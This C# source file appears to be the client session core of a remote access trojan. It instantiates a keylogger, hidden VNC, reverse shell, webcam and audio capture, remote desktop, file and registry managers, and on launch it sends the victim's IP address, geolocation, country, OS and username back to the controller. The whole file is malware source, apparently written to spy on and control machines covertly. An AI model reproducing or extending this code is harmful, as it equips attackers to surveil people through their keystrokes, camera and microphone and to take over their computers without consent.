using Common.Comunication;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Client.Web;
using Common.DTOs.Web;
using Common.DTOs.MessagePack;
using System.Runtime.InteropServices;
using Client.Utilities;

namespace Client.Communication
{
    internal class ClientSession : Session
    {
        AudioManager audioManager;
        FileManager fileManager;
        HVNC HVNC;
        Keylogger keylogger;
        RegistryManager registryManager;
        RemoteDesktop remoteDesktop;
        ReverseShell reverseShell;
        SystemInfo systemInfo;
        TaskManager taskManager;
        WebcamControl webcamControl;

        ClientInfoDTO clientInfo;

        public ClientSession(IConnectionProperties connectionProperties) : base(connectionProperties)
        {
            audioManager = new AudioManager(this);
            fileManager = new FileManager(this);
            HVNC = new HVNC(this);
            keylogger = new Keylogger(this);
            registryManager = new RegistryManager(this);
            remoteDesktop = new RemoteDesktop(this);
            reverseShell = new ReverseShell(this);
            systemInfo = new SystemInfo(this);
            taskManager = new TaskManager(this);
            webcamControl = new WebcamControl(this);

            OnPing += HandlePing;


            Task.Run(SendClientInfo);
        }

        private async void HandlePing(object? sender, EventArgs e)
        {
            await SendPacketAsync(new PingDTO());
        }

        private async Task SendClientInfo()
        {
            var info = await WebHelper.RetrieveIpInfo();
            clientInfo = new ClientInfoDTO()
            {
                IPAddress = info.ip,
                Date = "...",
                OS = RuntimeInformation.OSDescription,
                Location = info.loc,
                Version = Settings.version,
                Username = Environment.UserName,
                Ping = "...",
                Country=info.country,
            };
            await SendPacketAsync(clientInfo);
        }
    }
}
